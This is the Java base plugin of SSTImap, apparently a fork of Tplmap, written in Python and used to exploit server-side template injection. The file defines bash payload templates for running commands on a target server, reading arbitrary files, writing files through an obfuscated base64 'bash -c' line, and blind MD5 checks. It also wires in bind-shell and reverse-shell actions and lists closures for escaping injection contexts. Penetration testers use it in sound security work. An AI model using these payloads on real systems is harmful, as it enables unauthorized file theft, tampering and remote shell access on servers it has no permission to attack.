from core.plugin import Plugin
from core import bash
from utils import closures
from utils import rand
import re


class Java(Plugin):
    # 避免 int 溢出
    header_length = 9
    header_type = "add"
    no_tests = True
    priority = 8
    plugin_info = {
        "Description": '基于 Java 的模板引擎的基础。该插件不执行测试',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始Tplmap插件
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
    }

    def language_init(self):
        self.update_actions({
            # 准备仅用于盲检测。对于时间布尔值没有用
            # 测试（因为不能使用 && 字符）但足以用于检测阶段。
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'execute': {
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2],
                'test_os': """uname""",
                'test_os_expected': r'^[\w-]+$'
            },
            'read': {
                'call': 'execute',
                'read': """base64<'{path}'"""
            },
            'write': {
                'call': 'execute',
                'write': """bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}""",
                'truncate': """bash -c {{echo,-n,}}>{path}""",
            },
            'md5': {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'{path}'|head -c 32"""
            },
            'md5_blind': {
                'call': 'execute_blind',
                'md5_blind': """[ $($(type -p md5 md5sum)<'{path}'|head -c 32) == "{md5}" ]""",
                'exists_blind': """[ -f '{path}' ]"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            }
        })

    language = 'java'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var + closures.iterable_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
